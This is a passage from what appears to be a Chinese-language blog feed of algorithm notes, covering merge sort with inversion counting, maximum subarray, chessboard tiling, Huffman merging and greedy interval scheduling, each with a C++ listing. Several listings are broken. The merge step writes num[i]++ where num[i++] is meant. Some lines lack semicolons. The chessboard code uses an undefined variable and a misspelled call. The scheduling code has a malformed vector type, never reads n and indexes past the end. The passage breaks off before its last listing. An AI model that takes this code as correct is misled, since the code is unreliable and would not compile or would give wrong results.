从小到大排列</span></span><br><span class="line">        <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>(),cmp);</span><br><span class="line">        <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt; a : res)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> b : a)&#123;</span><br><span class="line">                cout&lt;&lt;<span class="built_in">setw</span>(<span class="number">3</span>)&lt;&lt;b;</span><br><span class="line">            &#125;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>暴力求解</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】分治算法</title>
    <url>/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="【算法】分治算法"><a href="#【算法】分治算法" class="headerlink" title="【算法】分治算法"></a>【算法】分治算法</h1><p>分治算法通过递归分解大问题为若干个子问题, 解决每个子问题后合并各个子问题, 直到合并为原来的大问题.</p>
<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>归并排序是经典的分治解决问题的算法, 通过分解数组, 递归求解, 合并排序这三个步骤对数组排序.</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image.png"></p>
<p>先分析归并排序的复杂度, 由于每次合并需要遍历所有数组, 共 $n$ 次, 然后需要遍历每一层, 一共有 $log_2n$ 层, 所以归并排序的复杂度为 $O(nlogn)$ , 是稳定的排序算法.</p>
<p>由于归并过程允许我们对每一个子问题操作, 所以归并排序可以解决很多问题, 以一道题目为例:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-1.png"></p>
<p>这道题在合并过程中, 可以通过合并右边那部分数组的<strong>移位差</strong>来获得逆序对的个数, 比如 5 和 4 合并时, 4 从第 1 位移到了第 0 位, 所以逆序对个数+1, 同理 45 和 26 合并时, 2 从第 2 位移到了第 0 位, 逆序对+2… 这里由于只有右半部分会产生逆序对, 需要定义一个 <code>mid</code> 变量去获取归并时的中间值,确保<strong>只对左半部分求移位差</strong>, 如下图:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-2.png"></p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> num[<span class="number">500010</span>];</span><br><span class="line"><span class="type">int</span> tmp[<span class="number">500010</span>];</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> mid, <span class="type">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = start;</span><br><span class="line">    <span class="type">int</span> j = mid+<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=end)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i]&gt;num[j])&#123;</span><br><span class="line">            tmp[idx++] = num[j++];</span><br><span class="line">            res += mid-i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tmp[idx++]=num[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)&#123;</span><br><span class="line">        tmp[idx++]=num[i]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=end)&#123;</span><br><span class="line">        tmp[idx++]=num[j]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(start&gt;=end)&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> mid = (start+end)/<span class="number">2</span></span><br><span class="line">    <span class="built_in">merge_sort</span>(start, mid);</span><br><span class="line">    <span class="built_in">merge_sort</span>(mid+<span class="number">1</span>,end);</span><br><span class="line">    <span class="built_in">merge</span>(start,mid,end);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;=end;i++)&#123;</span><br><span class="line">        num[i]=tmp[i-start];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">merge_sort</span>(<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分治法求解最大和子序列"><a href="#分治法求解最大和子序列" class="headerlink" title="分治法求解最大和子序列"></a>分治法求解最大和子序列</h2><p>例题:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-3.png"></p>
<p>这道题与上一章暴力求解法的是一道题, 这次采用分治法去求解, 在这里, 大问题是求整个数组的最大子序列和, 我们将这个问题分成多个区间去求解, 即就是求每个区间的最大子序列和, 然后再在合并的时候去判断怎么获得最大子序列和.</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-4.png"></p>
<p>合并的时候要算 3 种情况:</p>
<ul>
<li>$S1$ 为左半部分的最大子序列和</li>
<li>$S2$ 为右半部分的最大子序列和</li>
<li>$S3$ 为合并后包括 <code>mid</code> 和 <code>mid+1</code> 这两个元素的最大子序列和, 这里要针对 <code>mid</code> 往左找最大子序列和, 针对 <code>mid+1</code>往右找最大子序列和, 因为已经分别固定了开头, 所以这个查找就很简单, 直接线性遍历并记录最大值就好就好.</li>
</ul>
<p>最后求解 $max{S1,S2,S3}$, 就是合并后的最优解了.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> left,right,sum;</span><br><span class="line">    <span class="built_in">node</span>(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> s):</span><br><span class="line">    <span class="built_in">left</span>(l),<span class="built_in">right</span>(r),<span class="built_in">sum</span>(s)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">node <span class="title">merge_func</span><span class="params">(<span class="type">int</span> low,<span class="type">int</span> mid,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="function">node <span class="title">merge</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max_left = <span class="number">-10000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=mid;i&gt;=low;i--)&#123;</span><br><span class="line">        sum+=a[i];</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;max_left)&#123;</span><br><span class="line">            max_left = sum;</span><br><span class="line">            merge.left = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max_right = <span class="number">-10000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=mid+<span class="number">1</span>;i&lt;=high;i++)&#123;</span><br><span class="line">        sum+=a[i];</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;max_right)&#123;</span><br><span class="line">            max_right = sum;</span><br><span class="line">            merge.right = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;max_left&lt;&lt;&quot; &quot;&lt;&lt;max_right&lt;&lt;endl;</span></span><br><span class="line">    merge.sum = max_left + max_right;</span><br><span class="line">    <span class="keyword">return</span> merge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">node <span class="title">merge1</span><span class="params">(<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(low==high)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">node</span>(low,high,a[low]);</span><br><span class="line">    <span class="type">int</span> mid = (low+high)/<span class="number">2</span>;</span><br><span class="line">    node n1 = <span class="built_in">merge1</span>(low,mid);</span><br><span class="line">    node n2 = <span class="built_in">merge1</span>(mid+<span class="number">1</span>,high);</span><br><span class="line">    node n3 = <span class="built_in">merge_func</span>(low, mid, high);</span><br><span class="line">    <span class="keyword">if</span>(n1.sum&gt;=n2.sum &amp;&amp; n1.sum&gt;=n3.sum)&#123;</span><br><span class="line">        <span class="keyword">return</span> n1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n2.sum&gt;=n1.sum &amp;&amp; n2.sum&gt;=n3.sum)&#123;</span><br><span class="line">        <span class="keyword">return</span> n2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> case_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">        <span class="type">int</span> m;</span><br><span class="line">        cin&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            cin&gt;&gt;a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        node ans = <span class="built_in">merge1</span>(<span class="number">0</span>, m<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(case_num)</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case &quot;</span>&lt;&lt;++case_num&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;ans.sum&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans.left+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans.right+<span class="number">1</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分治法求解棋盘问题"><a href="#分治法求解棋盘问题" class="headerlink" title="分治法求解棋盘问题"></a>分治法求解棋盘问题</h2><p>题目:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-5.png"></p>
<p>这道题别被他的三角形骗了, 实际上使用分治做的, 将棋盘分割成四部分, 因为肯定有一个部分存在特殊方格, 另外三个部分在中心部分填如三角形即可, 示意图如下:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-6.png"></p>
<p>对于有特殊方块的区域, 就继续按照特殊方块分治, 对于没有特殊方块的区域, 就把用三角形填入的那个一个方格当成特殊方块, 继续分治.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> board[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"><span class="comment">// c, r 是起始点的横纵坐标, x,y 是特殊方格的横纵坐标, s 是当前棋盘的 size</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">chessboard</span><span class="params">(<span class="type">int</span> c, <span class="type">int</span> r, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(size==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> cnt = ++num;</span><br><span class="line">    <span class="type">int</span> s = size/<span class="number">2</span>; <span class="comment">//分割棋盘</span></span><br><span class="line">    <span class="type">int</span> midx = c+s<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> midy = r+s<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 左下</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;=midx &amp;&amp; y&lt;=midy)&#123;</span><br><span class="line">        <span class="comment">// 如果存在特殊方格就继续分治</span></span><br><span class="line">        <span class="built_in">chessboard</span>(c,r,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 否则将三角形覆盖的那个方格当做特殊方格继续分治</span></span><br><span class="line">        board[midx][midy] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c,r,midx,midy,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 右下</span></span><br><span class="line">    <span class="keyword">if</span>(x&gt;midx &amp;&amp; y&lt;=midy)&#123;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        board[midx+<span class="number">1</span>][midy] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r,midx+<span class="number">1</span>,midy,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//左上</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;=midx &amp;&amp; y&gt;midy)&#123;</span><br><span class="line">        <span class="built_in">chessboard</span>(c,r+s,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        board[midx][midy+<span class="number">1</span>] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c,r+s,midx,midy+<span class="number">1</span>,s);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//右上</span></span><br><span class="line">    <span class="keyword">if</span>(x&gt;midx &amp;&amp; y&gt;midy)&#123;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r+s,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        board[midx+<span class="number">1</span>][midy+<span class="number">1</span>] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r+s,midx+<span class="number">1</span>,midy+<span class="number">1</span>,s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> k,x,y;</span><br><span class="line">    cin&gt;&gt;k&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    board[x][y] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 用 1&lt;&lt;k 获取棋盘分治的个数 2 的 k 次方</span></span><br><span class="line">    <span class="built_in">chessBoard</span>(<span class="number">1</span>, <span class="number">1</span>, x, y, (<span class="number">1</span>&lt;&lt;k));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=(<span class="number">1</span>&lt;&lt;k);i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=(<span class="number">1</span>&lt;&lt;k);j++)&#123;</span><br><span class="line">            cout&lt;&lt;board[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分治</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】贪心算法</title>
    <url>/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="【算法】贪心算法"><a href="#【算法】贪心算法" class="headerlink" title="【算法】贪心算法"></a>【算法】贪心算法</h1><p>贪心算法在解决问题上的策略就是每次选取<strong>局部最优</strong>, 无论将来有什么结果, 这个选择都不会改变, 贪心算法能够获得近似最优解, 所以在使用贪心算法时要尝试去证明可行或者亲自去跑一下样例.</p>
<h2 id="霍夫曼编码"><a href="#霍夫曼编码" class="headerlink" title="霍夫曼编码"></a>霍夫曼编码</h2><p>霍夫曼编码其实也是一种贪心策略, 霍夫曼编码在每次编码时都会对出现频数少的字符进行编码, 示意图:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image.png"></p>
<p>通过每次对最少频数的字符编码来构造一颗霍夫曼树, 在最后高频词的字符就会被分配到短的二进制码.</p>
<p>例题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-1.png"></p>
<p>题目就是霍夫曼编码的模板题, 优先挑选消耗体力少的果子合并, 避免重复对消耗体力多的果子合并.</p>
<p>这里要注意的是如何通过代码去构造霍夫曼编码, 用到的方法是 <code>STL</code> 中的 <code>priority_queue</code> , 构建一个<strong>小根堆</strong>, 每次合并完后 <code>pop</code> 掉合并的两个元素, 在 <code>push</code> 合并后的元素即可.</p>
<p>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; <span class="function">heap</span></span><br><span class="line"><span class="function">    <span class="title">for</span><span class="params">(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        heap.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(heap.<span class="built_in">size</span>()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">int</span> x = heap.<span class="built_in">top</span>();</span><br><span class="line">        heap.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> y = heap.<span class="built_in">top</span>();</span><br><span class="line">        heap.<span class="built_in">pop</span>();</span><br><span class="line">        res += x+y;</span><br><span class="line">        heap.<span class="built_in">push</span>(x+y);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="区间调度问题"><a href="#区间调度问题" class="headerlink" title="区间调度问题"></a>区间调度问题</h2><p>区间调度问题大部分情况是使用动态规划去做, 但是贪心在证明正确性后也可以去解决区间调度问题, 例题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-2.png"></p>
<p>这道题就是要在有限时间内尽量完成多的事, 这里可以去构思谈心策略:</p>
<ul>
<li>最短时间优先: 不可行, 如果按照最短时间的话可能会产生空隙.</li>
<li>最早开始优先: 不可行, 如果一个节目最早开始但是持续很久, 也不会是最优策略</li>
<li>最早结束优先: 可行</li>
</ul>
<p>这里就采用<strong>最早结束优先</strong>策略, 在写代码的时候要构造一个 <code>pair</code> 去记录开始时间和结束时间, 以便解决区间覆盖问题.</p>
<p>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">vector&lt;&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; TVs;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> start, end;</span><br><span class="line">        cin&gt;&gt;start&gt;&gt;end;</span><br><span class="line">        <span class="comment">// 这里将 end 写在前面可以不用重构 cmp</span></span><br><span class="line">        TVs.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(end,start));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(TVs.<span class="built_in">begin</span>(),TVs.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> res=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(TVs[i].second &gt;= TVs[tmp].first)&#123;</span><br><span class="line">            tmp = i;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再来看一道例题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-3.png"></p>
<p>这道题由于奶牛到了一定要挤奶, 所以区间是无法变动的, 一定要安排一个栅栏给他, 这道题中的贪心策略就是时间开始早的先安排, 如果有空的就给他安排上, 没空的就再开一个栅栏.</p>
<p>代码的关键点就是要写一个结构体去记录奶牛的产奶时间, 结束时间和奶牛对应的编号, 对于每个栅栏, 要开一个 <code>pair</code>, 记录当前栅栏奶牛产奶的结束时间和自己的编号.</p>
<p>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cow</span>&#123;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> end;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> ans[<span class="number">50001</span>];</span><br><span class="line">cow cows[<span class="number">50001</span>];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(cow a,cow b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.start&lt;b.start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;cows[i].start&gt;&gt;cows[i].end;</span><br><span class="line">        cows[i].id = i;</span><br><span class="line">    &#125;</span><br><span class="line">    priority_queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;,vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; &gt;,greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; &gt; que;</span><br><span class="line">    <span class="built_in">sort</span>(cows,cows+n,cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(que.<span class="built_in">empty</span>()||que.<span class="built_in">top</span>().first&gt;=cows[i].start)&#123;</span><br><span class="line">            pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; stall;</span><br><span class="line">            stall.first = cows[i].end;</span><br><span class="line">            stall.second = (<span class="type">int</span>)que.<span class="built_in">size</span>();</span><br><span class="line">            ans[cows[i].id] = stall.second;</span><br><span class="line">            que.<span class="built_in">push</span>(stall);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; stall = que.<span class="built_in">top</span>();</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">            stall.first = cows[i].end;</span><br><span class="line">            ans[cows[i].id] = stall.second;</span><br><span class="line">            que.<span class="built_in">push</span>(stall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;que.<span class="built_in">size</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;ans[i]+<span class="number">1</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="纸牌均分问题"><a href="#纸牌均分问题" class="headerlink" title="纸牌均分问题"></a>纸牌均分问题</h2><p>直接来看题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-4.png"></p>
<p>这道题用谈心策略解决, 具体的策略为每次移动都让被移动方达到最终的状态.</p>
<p>在这里, 最终状态是已知的(求和后除以 $N$ 就好), 我们要达到贪心策略, 那就是根据最终状态来算出当前纸牌需要移动或者获得多少张牌才达到最终状态, 例如 9 8 17 6 中, 最终状态为 10, 我们先将每一个数减去 10, 得到 -1 -2 7 -4.然后从左往右开始, 第一个牌堆是-1, 那就把 -1 加到第二个牌堆去, 此时为 0 -3 7 -4, 在到第二个牌堆, 将 -3 移过去, 就变成 0 0 4 -4, 以此类推最后到达状态 0 0 0 0, 并记录移动次数即可.</p>
<p>具体代码有很多细节,减去均值后, 要找到左起第一个非 0 的和右起第一个非 0 的才可以继续, 并且在移牌的时候可能会产生 0 , 或者中间就有为 0 的牌堆, 要记得剔除掉这些情况.<br>代码为:</p>
